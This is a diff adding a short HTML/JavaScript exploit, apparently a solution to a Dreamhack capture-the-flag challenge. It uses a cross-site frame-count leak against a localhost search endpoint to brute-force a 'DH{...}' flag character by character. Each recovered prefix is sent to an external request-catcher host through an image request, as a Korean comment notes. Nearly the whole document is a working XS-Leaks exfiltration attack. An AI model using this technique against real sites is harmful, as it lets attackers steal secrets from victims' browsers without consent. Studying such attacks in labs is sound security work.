@@ -1,0 +1,39 @@
+<iframe id="iframe"></iframe>
+<script>
+async function req(url) {
+    return new Promise((resolve, reject) => {
+        const iframe = document.getElementById("iframe");
+        iframe.src = url;
+        iframe.onload = () => {
+            if (iframe.contentWindow.frames.length != 0) resolve();
+            else reject();
+        };
+    });
+}
+
+async function search(query) {
+    try {
+        await req(`http://localhost:8000/search?query=${query}`);
+        return true;
+    } catch {
+        return false;
+    }
+}
+
+async function exploit() {
+    let chars = "0123456789abcdef}";
+    let secret = "DH{";
+
+    while (!secret.includes("}")) {
+        for (let c of chars) {
+            if (await search(secret + c)) {
+                secret += c;
+                // 맞춘 글자를 외부 서버로 전송
+                new Image().src = `https://[내-리퀘스트캐처].request.dreamhack.games/${secret}`;
+                break;
+            }
+        }
+    }
+}
+exploit();
+</script>
